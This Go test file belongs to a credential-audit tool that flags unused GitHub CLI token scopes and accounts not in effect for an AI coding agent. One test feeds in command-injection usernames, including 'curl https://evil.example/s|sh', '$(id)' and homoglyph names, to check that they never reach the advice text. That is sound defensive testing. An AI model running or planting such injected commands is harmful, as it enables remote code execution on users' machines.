package rules

import (
	"fmt"
	"reflect"
	"strings"
	"testing"
	"time"

	"github.com/VSN2015/agentctl/internal/model"
	"github.com/VSN2015/agentctl/internal/usage"
)

func ghCred(host string, res *model.Resolution) model.Credential {
	return model.Credential{Tool: "gh", ID: host, Source: "file", Kind: "file-host", Resolved: res}
}

func ghUse(subs ...string) AgentUse {
	var cs []usage.Call
	for _, s := range subs {
		cs = append(cs, calls(1, "gh", s, "")...)
	}
	return AgentUse{Count: len(cs), Calls: cs, State: UseUsed}
}

func TestGHUnusedScopes(t *testing.T) {
	c := ghCred("github.com", &model.Resolution{Scopes: []string{"repo", "workflow", "admin:org"}, ScopesReadable: true})
	got := GHRule{}.Risks(c, model.AgentState{}, ghUse("pr", "pr", "pr"), Context{})
	if len(got) != 1 || got[0].Rule != "gh.unused-scopes" || got[0].Severity != model.SevMed {
		t.Fatalf("%+v", got)
	}
	d := strings.Join(got[0].Details, "|")
	for _, w := range []string{"Scopes: repo, workflow, admin:org", "Agent's commands needed: repo", "Unused scopes: workflow, admin:org"} {
		if !strings.Contains(d, w) {
			t.Errorf("missing %q in %s", w, d)
		}
	}
	if !strings.Contains(got[0].Advice[0], "https://github.com/settings/tokens") {
		t.Error(got[0].Advice)
	}
}

func TestGHScopeTable(t *testing.T) {
	cases := []struct {
		scopes []string
		subs   []string
		unused string // "" means no risk
	}{
		{[]string{"workflow"}, []string{"run"}, ""},
		{[]string{"repo", "workflow"}, []string{"run"}, ""},
		{[]string{"public_repo", "repo_deployment", "repo:invite", "security_events"}, []string{"pr"}, ""},
		{[]string{"repo", "workflow", "admin:org"}, []string{"pr", "pr", "pr"}, "workflow, admin:org"},
		{[]string{"repo"}, []string{"issue", "repo", "release", "pr"}, ""},
		{[]string{"gist", "repo"}, []string{"gist"}, "repo"},
		{[]string{"read:org"}, []string{"org"}, ""},
		{[]string{"admin:org"}, []string{"org"}, ""},
		{[]string{"repo", "repo:status"}, []string{"pr"}, ""},
	}
	for _, c := range cases {
		got := GHRule{}.Risks(ghCred("github.com", &model.Resolution{Scopes: c.scopes, ScopesReadable: true}), model.AgentState{}, ghUse(c.subs...), Context{})
		if c.unused == "" && len(got) != 0 {
			t.Errorf("%v %v: %+v", c.scopes, c.subs, got)
		}
		if c.unused != "" && (len(got) != 1 || !has(got[0].Details, "Unused scopes: "+c.unused)) {
			t.Errorf("%v %v: %+v", c.scopes, c.subs, got)
		}
	}
}

func TestGHApiCallsSuppressScopeFinding(t *testing.T) {
	c := ghCred("github.com", &model.Resolution{Scopes: []string{"repo", "admin:org"}, ScopesReadable: true})
	for _, subs := range [][]string{{"pr", "api"}, {"pr", ""}, {"pr", "somethingnew"}} {
		got := GHRule{}.Risks(c, model.AgentState{}, ghUse(subs...), Context{})
		if len(got) != 1 || got[0].Rule != "" || !has(got[0].Details, "cannot be attributed") {
			t.Errorf("%v: %+v", subs, got)
		}
	}
}

func TestGHFineGrainedUnreadable(t *testing.T) {
	c := ghCred("github.com", &model.Resolution{})
	got := GHRule{}.Risks(c, model.AgentState{}, ghUse("pr"), Context{})
	if len(got) != 1 || got[0].Rule != "" || !has(got[0].Details, "permissions cannot be read") {
		t.Fatalf("%+v", got)
	}
}

func TestGHAttributionDefaultHost(t *testing.T) {
	in := append(calls(1, "gh", "pr", ""), calls(1, "gh", "pr", "ghe.example.com")...)
	n := func(host, ghHost string) int {
		own, _ := GHRule{}.Attribute(ghCred(host, nil), in, Context{Getenv: func(k string) string {
			if k == "GH_HOST" {
				return ghHost
			}
			return ""
		}})
		return len(own)
	}
	if n("github.com", "") != 1 || n("ghe.example.com", "") != 1 {
		t.Error("unset: \"\" only counts for github.com")
	}
	if n("github.com", "ghe.example.com") != 0 || n("ghe.example.com", "ghe.example.com") != 2 {
		t.Error("GH_HOST: \"\" counts for ghe.example.com")
	}
}

func TestGHEnterprisePlaceholderTakesNoCalls(t *testing.T) {
	c := model.Credential{Tool: "gh", ID: "enterprise", Kind: "env-token", Source: "env"}
	x := Context{Getenv: func(string) string { return "" }}
	in := append(calls(2, "gh", "pr", ""), calls(1, "gh", "pr", "enterprise")...)
	if own, un := (GHRule{}).Attribute(c, in, x); len(own) != 0 || un != 3 {
		t.Fatal(own, un)
	}
	c.Resolved = &model.Resolution{Scopes: []string{"repo", "gist"}, ScopesReadable: true}
	if got := (GHRule{}).Risks(c, model.AgentState{}, ghUse("pr"), x); len(got) != 0 {
		t.Fatalf("no URL or risk from placeholder: %+v", got)
	}
}

func TestGHAdviceAndRevokeNone(t *testing.T) {
	c := ghCred("ghe.example.com", &model.Resolution{Scopes: []string{"repo", "gist"}, ScopesReadable: true})
	got := GHRule{}.Risks(c, model.AgentState{}, ghUse("pr"), Context{})
	if len(got) != 1 || !strings.Contains(got[0].Advice[0], "https://ghe.example.com/settings/tokens") {
		t.Fatalf("%+v", got)
	}
	if s := (GHRule{}).Revoke(c, Context{}); s != "" {
		t.Fatal(s)
	}
}

func ghEngine(c model.Credential, u usage.Usage) model.Finding {
	c.Access = []model.AgentState{{Agent: "claude-code", Access: model.AccessAllowed}}
	return run(c, agentIn(u), GHRule{})
}

func ghUsage(days, n int, target string) usage.Usage {
	u := hist(days)
	u.Shell = calls(n, "gh", "pr", target)
	return u
}

func TestGHOtherHostCallsWithoutTargetAreUnattributable(t *testing.T) {
	c := ghCred("ghe.corp.com", nil)
	f := ghEngine(c, ghUsage(45, 40, ""))
	if has(f.Rules, "usage.unused") || f.Severity != model.SevOK || has(f.Advice, "revoke") || len(f.Advice) != 0 || !has(f.Details, "could not be attributed") {
		t.Fatalf("%+v", f)
	}
	if f := ghEngine(c, ghUsage(45, 3, "ghe.corp.com")); !strings.Contains(f.Headline, "used 3 times") {
		t.Fatalf("own calls: %+v", f)
	}
	own, un := GHRule{}.Attribute(c, calls(2, "gh", "pr", ""), Context{})
	if len(own) != 0 || un != 2 {
		t.Fatal(own, un)
	}
	// default host still owns Target "" calls
	own, un = GHRule{}.Attribute(ghCred("github.com", nil), calls(2, "gh", "pr", ""), Context{})
	if len(own) != 2 || un != 0 {
		t.Fatal(own, un)
	}
}

func TestGHEnterprisePlaceholderUnattributableWhenCalls(t *testing.T) {
	c := model.Credential{Tool: "gh", ID: "enterprise", Kind: "env-token", Source: "env"}
	f := ghEngine(c, ghUsage(45, 5, ""))
	if has(f.Rules, "usage.unused") || has(f.Advice, "revoke") || !has(f.Details, "could not be attributed") {
		t.Fatalf("with calls: %+v", f)
	}
	if f := ghEngine(c, hist(45)); !has(f.Rules, "usage.unused") {
		t.Fatalf("no gh calls at all stays unused: %+v", f)
	}
}

func TestGHUnattributedCallsBlockRareAndScopeFinding(t *testing.T) {
	c := ghCred("ghe.corp.com", &model.Resolution{Scopes: []string{"repo", "admin:org"}, ScopesReadable: true})
	u := hist(45)
	u.Shell = append(calls(2, "gh", "pr", "ghe.corp.com"), calls(200, "gh", "pr", "")...)
	f := ghEngine(c, u)
	if has(f.Rules, "usage.rare") || has(f.Rules, "gh.unused-scopes") || f.Severity != model.SevOK || len(f.Advice) != 0 ||
		!has(f.Details, "could not be attributed") || !has(f.Details, "Scope need cannot be attributed") {
		t.Fatalf("%+v", f)
	}
	// 3 or more own calls stay "used"; the scope check still stays off while calls are unattributed
	u.Shell = append(calls(3, "gh", "pr", "ghe.corp.com"), calls(200, "gh", "pr", "")...)
	f = ghEngine(c, u)
	if !strings.Contains(f.Headline, "used 3 times") || has(f.Rules, "usage.rare") || has(f.Rules, "gh.unused-scopes") {
		t.Fatalf("own calls >= 3: %+v", f)
	}
	got := GHRule{}.Risks(c, model.AgentState{}, AgentUse{Calls: calls(2, "gh", "pr", ""), Count: 2, Unattributed: 5, State: UseUnattributable}, Context{})
	if len(got) != 1 || got[0].Rule != "" || !has(got[0].Details, "Scope need cannot be attributed") {
		t.Fatalf("%+v", got)
	}
}

func ghTrio() (alice, bob, env model.Credential) {
	alice = model.Credential{Tool: "gh", ID: "alice@github.com", Label: "alice@github.com", Identity: "alice", Host: "github.com", Source: "file", Kind: "file-host"}
	bob = model.Credential{Tool: "gh", ID: "bob@github.com", Label: "bob@github.com", Identity: "bob", Host: "github.com", Source: "file", Kind: "file-host-inactive"}
	env = model.Credential{Tool: "gh", ID: "@github.com", Label: "GH_TOKEN@github.com", Host: "github.com", Source: "env", Kind: "env-token"}
	return
}

func TestGHAttributionOnlyCredentialInEffect(t *testing.T) {
	alice, bob, env := ghTrio()
	in := append(calls(2, "gh", "pr", ""), calls(1, "gh", "pr", "github.com")...)
	count := func(c model.Credential, all ...model.Credential) (int, int) {
		own, un := GHRule{}.Attribute(c, in, Context{Creds: all})
		return len(own), un
	}
	all := []model.Credential{alice, bob, env}
	if o, u := count(env, all...); o != 3 || u != 0 {
		t.Errorf("env: %d %d", o, u)
	}
	for _, c := range []model.Credential{alice, bob} {
		if o, u := count(c, all...); o != 0 || u != 0 {
			t.Errorf("%s: %d %d", c.ID, o, u)
		}
	}
	noEnv := []model.Credential{alice, bob}
	if o, u := count(alice, noEnv...); o != 3 || u != 0 {
		t.Errorf("alice without env: %d %d", o, u)
	}
	if o, u := count(bob, noEnv...); o != 0 || u != 0 {
		t.Errorf("bob without env: %d %d", o, u)
	}
}

func ghTrioEngine(t *testing.T, u usage.Usage, withEnv bool) map[string]model.Finding {
	t.Helper()
	alice, bob, env := ghTrio()
	cs := []model.Credential{alice, bob}
	if withEnv {
		cs = append(cs, env)
	}
	for i := range cs {
		cs[i].Access = []model.AgentState{{Agent: "claude-code", Access: model.AccessAllowed}}
	}
	out := map[string]model.Finding{}
	for _, f := range Evaluate(Input{Creds: cs, Agents: []AgentInput{agentIn(u)}, Now: now, Window: window}, []ToolRule{GHRule{}}) {
		out[f.Subject] = f
	}
	return out
}

func TestGHInactiveAccountIsNotInEffectThroughEngine(t *testing.T) {
	const logout = "log out of a GitHub account you do not use: gh auth logout --hostname github.com --user "
	notInEffect := func(f model.Finding, user, sibling string) {
		t.Helper()
		if f.Severity != model.SevLow || f.Issue != "not in effect" || f.Used != "" || has(f.Rules, "usage.unused") {
			t.Fatalf("%s: %+v", f.Subject, f)
		}
		if len(f.Advice) != 1 || f.Advice[0] != logout+user {
			t.Fatalf("%s advice: %q", f.Subject, f.Advice)
		}
		if got := has(f.Details, "gh uses "+sibling+" for github.com"); got != (sibling != "") {
			t.Fatalf("%s details: %q", f.Subject, f.Details)
		}
	}
	fs := ghTrioEngine(t, ghUsage(45, 5, "github.com"), false)
	notInEffect(fs["bob@github.com"], "bob", "alice@github.com")
	if f := fs["alice@github.com"]; has(f.Rules, "usage.unused") || f.Used != "5" || f.Issue == "not in effect" {
		t.Fatalf("alice: %+v", f)
	}
	fs = ghTrioEngine(t, ghUsage(45, 5, "github.com"), true)
	notInEffect(fs["alice@github.com"], "alice", "GH_TOKEN@github.com")
	notInEffect(fs["bob@github.com"], "bob", "GH_TOKEN@github.com")
	if f := fs["@github.com"]; f.Used != "5" || f.Issue == "not in effect" {
		t.Fatalf("env: %+v", f)
	}
}

func TestGHSingleLoginWithEnvToken(t *testing.T) {
	alice, _, env := ghTrio()
	run := func(cs ...model.Credential) map[string]model.Finding {
		for i := range cs {
			cs[i].Access = []model.AgentState{{Agent: "claude-code", Access: model.AccessAllowed}}
		}
		out := map[string]model.Finding{}
		for _, f := range Evaluate(Input{Creds: cs, Agents: []AgentInput{agentIn(ghUsage(45, 0, "github.com"))}, Now: now, Window: window}, []ToolRule{GHRule{}}) {
			out[f.Subject] = f
		}
		return out
	}
	before := run(env)["@github.com"] // a lone environment token: what a single login had before
	both := run(alice, env)
	if f := both["@github.com"]; !reflect.DeepEqual(f, before) {
		t.Fatalf("env finding changed:\n%+v\n%+v", f, before)
	}
	f := both["alice@github.com"]
	if f.Severity != model.SevLow || f.Issue != "not in effect" || len(f.Advice) != 1 ||
		f.Advice[0] != "log out of a GitHub account you do not use: gh auth logout --hostname github.com --user alice" {
		t.Fatalf("%+v", f)
	}
	for _, a := range f.Advice {
		if strings.Contains(a, "deny") || strings.Contains(a, revokeIfNone) {
			t.Fatalf("advice %q", a)
		}
	}
}

func TestGHEmptyUserNoneInEffect(t *testing.T) {
	alice, bob, _ := ghTrio()
	alice.Kind = "file-host-inactive" // hosts.yml has users: but no top-level user:
	cs := []model.Credential{alice, bob}
	for i := range cs {
		cs[i].Access = []model.AgentState{{Agent: "claude-code", Access: model.AccessAllowed}}
	}
	for _, f := range Evaluate(Input{Creds: cs, Agents: []AgentInput{agentIn(ghUsage(45, 5, "github.com"))}, Now: now, Window: window}, []ToolRule{GHRule{}}) {
		if f.Severity != model.SevLow || f.Issue != "not in effect" || f.Used != "" || has(f.Details, "gh uses") {
			t.Errorf("%+v", f)
		}
	}
}

func TestGHDeveloperUseOnlyInEffect(t *testing.T) {
	alice, bob, _ := ghTrio()
	x := Context{Now: now, Window: window, Creds: []model.Credential{alice, bob},
		Dev: devHistory(t, zshAt(now.Add(-time.Hour), "gh pr list --hostname github.com"))}
	if d := (GHRule{}).DeveloperUse(alice, AgentUse{}, x); d.State != DevKnownRecent {
		t.Errorf("in effect: %+v", d)
	}
	d := GHRule{}.DeveloperUse(bob, AgentUse{}, x)
	if d.State != DevUnknown || d.Why != "shell history cannot prove nobody uses it" {
		t.Errorf("inactive: %+v", d)
	}
}

func TestGHAdviceUsesHost(t *testing.T) {
	alice, _, _ := ghTrio()
	alice.Resolved = &model.Resolution{Scopes: []string{"repo", "gist"}, ScopesReadable: true}
	got := GHRule{}.Risks(alice, model.AgentState{}, ghUse("pr"), Context{})
	if len(got) != 1 || got[0].Advice[0] != "replace the token with fewer scopes: https://github.com/settings/tokens" {
		t.Fatalf("%+v", got)
	}
}

func TestGHAttributionGHHostWithCreds(t *testing.T) {
	_, _, env := ghTrio()
	env.ID, env.Host = "@ghe.example.com", "ghe.example.com"
	in := append(calls(1, "gh", "pr", ""), calls(1, "gh", "pr", "ghe.example.com")...)
	x := Context{Creds: []model.Credential{env}, Getenv: func(k string) string {
		if k == "GH_HOST" {
			return "ghe.example.com"
		}
		return ""
	}}
	if own, _ := (GHRule{}).Attribute(env, in, x); len(own) != 2 {
		t.Fatal(own)
	}
}

func TestGHNotInEffectAdviceOmitsUnsafeUser(t *testing.T) {
	_, _, env := ghTrio()
	for _, name := range []string{"x; curl https://evil.example/s|sh", "$(id)", "a b", "-a", "al​ice", "аlice", "bad`id`"} {
		c := ghCred("github.com", nil)
		c.Kind, c.Identity = "file-host-inactive", name
		d, adv, ok := ghNotInEffect(c, Context{Creds: []model.Credential{c, env}})
		got := strings.Join(append(d, adv...), "|")
		if !ok || strings.Contains(got, name) || strings.Contains(got, "--user") || strings.Contains(got, "logout") || !strings.HasSuffix(got, "check which GitHub account gh uses: gh auth status --hostname github.com") {
			t.Errorf("%q: %q", name, got)
		}
	}
	c := ghCred("github.com", nil)
	c.Kind, c.Identity = "file-host-inactive", "octo_corp"
	if _, adv, _ := ghNotInEffect(c, Context{}); !strings.HasSuffix(adv[0], "--user octo_corp") {
		t.Errorf("%q", adv)
	}
}

func TestGHNotInEffectKeepsFileBlockedSignal(t *testing.T) {
	_, bob, _ := ghTrio()
	bob.Access = []model.AgentState{{Agent: "claude-code", Access: model.AccessAllowed, FileBlocked: true}}
	fs := Evaluate(Input{Creds: []model.Credential{bob}, Agents: []AgentInput{agentIn(ghUsage(45, 5, "github.com"))}, Now: now, Window: window}, []ToolRule{GHRule{}})
	f := fs[0]
	if f.Severity != model.SevLow || f.Issue != "not in effect, file blocked, tool allowed" || len(f.Advice) != 1 || !f.FileBlocked {
		t.Fatalf("%+v", f)
	}
}

func TestGHHostOnlyCredentialTakesUsageThroughEngine(t *testing.T) {
	alice, bob, _ := ghTrio()
	alice.Kind = "file-host-inactive"
	host := model.Credential{Tool: "gh", ID: "github.com", Label: "github.com", Host: "github.com", Source: "file", Kind: "file-host"}
	cs := []model.Credential{alice, bob, host}
	for i := range cs {
		cs[i].Access = []model.AgentState{{Agent: "claude-code", Access: model.AccessAllowed}}
	}
	got := map[string]model.Finding{}
	for _, f := range Evaluate(Input{Creds: cs, Agents: []AgentInput{agentIn(ghUsage(45, 5, "github.com"))}, Now: now, Window: window}, []ToolRule{GHRule{}}) {
		got[f.Subject] = f
	}
	if f := got["github.com"]; f.Used != "5" || f.Issue == "not in effect" {
		t.Fatalf("host-only: %+v", f)
	}
	for _, id := range []string{"alice@github.com", "bob@github.com"} {
		f := got[id]
		if f.Issue != "not in effect" || f.Severity != model.SevLow || f.Used != "" ||
			!has(f.Details, "hosts.yml names no active account for github.com; gh uses the token stored for the host, which may belong to this account") ||
			has(f.Details, "gh uses github.com for") || !reflect.DeepEqual(f.Advice, []string{"check which GitHub account gh uses: gh auth status --hostname github.com"}) ||
			strings.Contains(strings.Join(append(f.Details, f.Advice...), "|"), "logout") {
			t.Fatalf("%s: %+v", id, f)
		}
	}
}

func TestGHCallTargetsMatchCaseInsensitively(t *testing.T) {
	ghe := ghCred("ghe.example.com", nil)
	in := calls(1, "gh", "pr", "GHE.Example.com")
	if own, _ := (GHRule{}).Attribute(ghe, in, Context{}); len(own) != 1 {
		t.Errorf("--hostname: %v", own)
	}
	x := Context{Getenv: func(k string) string {
		if k == "GH_HOST" {
			return "GitHub.com"
		}
		return ""
	}}
	if own, _ := (GHRule{}).Attribute(ghCred("github.com", nil), calls(1, "gh", "pr", "GitHub.com"), x); len(own) != 1 {
		t.Errorf("GH_HOST: %v", own)
	}
	// a call naming no host belongs to the default host: that needs defaultHost to lower-case GH_HOST
	if own, _ := (GHRule{}).Attribute(ghCred("github.com", nil), calls(1, "gh", "pr", ""), x); len(own) != 1 {
		t.Errorf("GH_HOST default: %v", own)
	}
}

func TestGHDeveloperUseMatchesHostCaseInsensitively(t *testing.T) {
	active := model.Credential{Tool: "gh", ID: "carol@ghe.example.com", Identity: "carol", Host: "ghe.example.com", Source: "file", Kind: "file-host"}
	inactive := model.Credential{Tool: "gh", ID: "dave@ghe.example.com", Identity: "dave", Host: "ghe.example.com", Source: "file", Kind: "file-host-inactive"}
	x := Context{Now: now, Window: window, Creds: []model.Credential{active, inactive},
		Dev: devHistory(t, zshAt(now.Add(-time.Hour), "gh pr list --hostname GHE.Example.com"))}
	if d := (GHRule{}).DeveloperUse(active, AgentUse{}, x); d.State != DevKnownRecent {
		t.Errorf("in effect: %+v", d)
	}
	if d := (GHRule{}).DeveloperUse(inactive, AgentUse{}, x); d.State != DevUnknown || d.Why != "shell history cannot prove nobody uses it" {
		t.Errorf("not in effect: %+v", d)
	}
}

func TestGHTokenShapedAccountNeverInAdvice(t *testing.T) {
	_, _, env := ghTrio()
	for _, name := range []string{"gho_" + strings.Repeat("a", 36), "GHP_" + strings.Repeat("a", 36), "github_pat_" + strings.Repeat("a", 30), "ghs_x", "ghu_x", "ghr_x"} {
		c := ghCred("github.com", nil)
		c.Kind, c.Identity = "file-host-inactive", name
		d, adv, ok := ghNotInEffect(c, Context{Creds: []model.Credential{c, env}})
		got := strings.Join(append(d, adv...), "|")
		if !ok || strings.Contains(got, name) || strings.Contains(got, "--user") || strings.Contains(got, "logout") || !strings.HasSuffix(got, "check which GitHub account gh uses: gh auth status --hostname github.com") {
			t.Errorf("%q: %q", name, got)
		}
	}
}

func TestGHHostNamedEnterpriseTakesUsage(t *testing.T) {
	real := model.Credential{Tool: "gh", ID: "alice@enterprise", Label: "alice@enterprise", Identity: "alice", Host: "enterprise", Source: "file", Kind: "file-host"}
	in := calls(2, "gh", "pr", "enterprise")
	if own, _ := (GHRule{}).Attribute(real, in, Context{Creds: []model.Credential{real}}); len(own) != 2 {
		t.Errorf("real host named enterprise got %d calls", len(own))
	}
	hostOnly := model.Credential{Tool: "gh", ID: "enterprise", Label: "enterprise", Host: "enterprise", Source: "file", Kind: "file-host"}
	if own, _ := (GHRule{}).Attribute(hostOnly, in, Context{Creds: []model.Credential{hostOnly}}); len(own) != 2 {
		t.Errorf("host-only entry named enterprise got %d calls", len(own))
	}
	ph := model.Credential{Tool: "gh", ID: "enterprise", Label: "enterprise", Source: "env", Kind: "env-token"}
	if own, un := (GHRule{}).Attribute(ph, in, Context{Creds: []model.Credential{ph}}); len(own) != 0 || un != 2 {
		t.Errorf("placeholder: %d %d", len(own), un)
	}
}

func TestGHNotInEffectHostOnlyShadowedByEnvUsesStatusAdvice(t *testing.T) {
	_, _, env := ghTrio()
	c := ghCred("github.com", nil)
	c.Kind, c.Identity = "file-host", ""
	d, adv, ok := ghNotInEffect(c, Context{Creds: []model.Credential{c, env}})
	if !ok || !reflect.DeepEqual(adv, []string{"check which GitHub account gh uses: gh auth status --hostname github.com"}) || strings.Contains(strings.Join(append(d, adv...), "|"), "logout") {
		t.Errorf("%v %v %v", ok, d, adv)
	}
	if len(d) != 1 || !strings.HasPrefix(d[0], "gh uses ") {
		t.Errorf("details changed: %q", d)
	}
}

func TestGHNotInEffectAdviceOmitsOverlongUser(t *testing.T) {
	_, _, env := ghTrio()
	for name, want := range map[string]bool{strings.Repeat("ab12", 10): false, strings.Repeat("a", 39): true} {
		c := ghCred("github.com", nil)
		c.Kind, c.Identity = "file-host-inactive", name
		_, adv, _ := ghNotInEffect(c, Context{Creds: []model.Credential{c, env}})
		if !want && strings.Contains(strings.Join(adv, "|"), "logout") {
			t.Errorf("%q: logout without --user: %q", name, adv)
		}
		if got := strings.Contains(strings.Join(adv, "|"), "--user "+name); got != want {
			t.Errorf("%q: user in advice = %v: %q", name, got, adv)
		}
	}
}

func TestGHEvaluateCappedHostIsFast(t *testing.T) {
	cs := []model.Credential{ghCred("github.com", nil)}
	for i := 0; i < 32; i++ {
		id := fmt.Sprintf("u%03d", i)
		cs = append(cs, model.Credential{Tool: "gh", ID: id + "@github.com", Source: "file", Kind: "file-host-inactive", Identity: id, Host: "github.com"})
	}
	start := time.Now()
	fs := Evaluate(Input{Creds: cs, Agents: []AgentInput{agentIn(ghUsage(45, 5, "github.com"))}, Now: now, Window: window}, []ToolRule{GHRule{}})
	d := time.Since(start)
	t.Logf("evaluate 33 credentials: %v", d)
	if len(fs) < len(cs) || d > 10*time.Second {
		t.Errorf("findings %d, took %v", len(fs), d)
	}
}

// The largest set Discover can emit: 34 hosts x 32 accounts, a host-level credential per host, and optionally an environment token per host.
func TestGHEvaluateMaximumDiscoverSetIsFast(t *testing.T) {
	for _, withEnv := range []bool{false, true} {
		var cs []model.Credential
		for h := 0; h < 34; h++ {
			host := fmt.Sprintf("h%02d.example.com", h)
			cs = append(cs, model.Credential{Tool: "gh", ID: host, Source: "file", Kind: "file-host", Host: host})
			if withEnv {
				cs = append(cs, model.Credential{Tool: "gh", ID: "@" + host, Source: "env", Kind: "env-token", Host: host})
			}
			for i := 0; i < 32; i++ {
				id := fmt.Sprintf("%du%02d", i%10, i)
				cs = append(cs, model.Credential{Tool: "gh", ID: id + "@" + host, Source: "file", Kind: "file-host-inactive", Identity: id, Host: host})
			}
		}
		start := time.Now()
		fs := Evaluate(Input{Creds: cs, Agents: []AgentInput{agentIn(ghUsage(45, 5, "github.com"))}, Now: now, Window: window}, []ToolRule{GHRule{}})
		d := time.Since(start)
		t.Logf("evaluate %d credentials (env=%v): %v", len(cs), withEnv, d)
		if len(fs) < len(cs) || d > 10*time.Second {
			t.Errorf("env=%v: findings %d of %d, took %v", withEnv, len(fs), len(cs), d)
		}
	}
}
